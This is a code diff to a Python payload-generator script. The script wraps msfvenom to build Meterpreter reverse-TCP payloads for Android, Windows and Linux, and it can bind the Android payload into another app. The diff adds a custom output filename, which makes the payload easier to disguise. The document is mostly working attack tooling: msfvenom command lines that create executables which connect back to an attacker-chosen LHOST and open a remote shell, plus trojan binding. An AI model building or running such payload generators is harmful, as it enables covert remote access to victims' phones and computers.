@@ -31,7 +31,7 @@ def execute_command(command, verbose=False):
         return error_message
 
 # Function to generate payloads
-def generate_payload(ip, port, payload_type, android_api_level=None, bind=False, bind_file=None, verbose=False):
+def generate_payload(ip, port, payload_type, android_api_level=None, bind=False, bind_file=None, custom_filename=None, verbose=False):
     try:
         if not ip or not port:
             raise ValueError("IP address and port are required.")
@@ -57,15 +57,36 @@ def generate_payload(ip, port, payload_type, android_api_level=None, bind=False,
             if not android_api_level:
                 raise ValueError("Android API level is required for Android payloads.")
 
-            output_file = f"Payloads/payload.apk"
+            if custom_filename and not custom_filename.endswith(".apk"):
+                raise ValueError("Invalid custom filename. Android payloads must have an '.apk' extension.")
+
+            if custom_filename:
+                output_file = f"Payloads/{custom_filename}"
+            else:
+                output_file = f"Payloads/payload.apk"
+
             payload_command = f"msfvenom -p android/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -o {output_file} --platform android -a dalvik"
 
         elif payload_type == "windows":
-            output_file = f"Payloads/payload.exe"
+            if custom_filename and not custom_filename.endswith(".exe"):
+                raise ValueError("Invalid custom filename. Windows payloads must have an '.exe' extension.")
+
+            if custom_filename:
+                output_file = f"Payloads/{custom_filename}"
+            else:
+                output_file = f"Payloads/payload.exe"
+
             payload_command = f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -o {output_file}"
 
         elif payload_type == "linux":
-            output_file = f"Payloads/payload.elf"
+            if custom_filename and not custom_filename.endswith(".elf"):
+                raise ValueError("Invalid custom filename. Linux payloads must have an '.elf' extension.")
+
+            if custom_filename:
+                output_file = f"Payloads/{custom_filename}"
+            else:
+                output_file = f"Payloads/payload.elf"
+
             payload_command = f"msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST={ip} LPORT={port} -o {output_file}"
 
         create_payloads_folder()
@@ -75,7 +96,14 @@ def generate_payload(ip, port, payload_type, android_api_level=None, bind=False,
                 raise ValueError("Binding file path is required.")
             
             if payload_type == "android":
-                output_file = f"Payloads/bind_payload.apk"
+                if custom_filename and not custom_filename.endswith(".apk"):
+                    raise ValueError("Invalid custom filename. Android payloads must have an '.apk' extension.")
+
+                if custom_filename:
+                    output_file = f"Payloads/{custom_filename}"
+                else:
+                    output_file = f"Payloads/bind_payload.apk"
+
                 binding_command = f"apktool b {output_file} -o {output_file} -f {bind_file}"
                 bind_output = execute_command(binding_command, verbose)
                 if "Exception" in bind_output:
@@ -133,10 +161,12 @@ if __name__ == "__main__":
 
     android_api_level = input("Enter Android API level (e.g., 33 for Android 13, or leave empty for other platforms): ")
 
+    custom_filename = input("Enter a custom filename (leave empty to use default naming): ").strip()
+
     bind = input("Do you want to bind payloads? (yes or no): ").strip().lower() == "yes"
     bind_file = input("Enter the path to the file you want to bind (leave empty if not binding): ").strip()
 
-    result = generate_payload(ip, port, payload_type, android_api_level, bind, bind_file, verbose=verbose)
+    result = generate_payload(ip, port, payload_type, android_api_level, bind, bind_file, custom_filename, verbose=verbose)
     print("\033[92m")
     print(result)
     print("\033[0m")
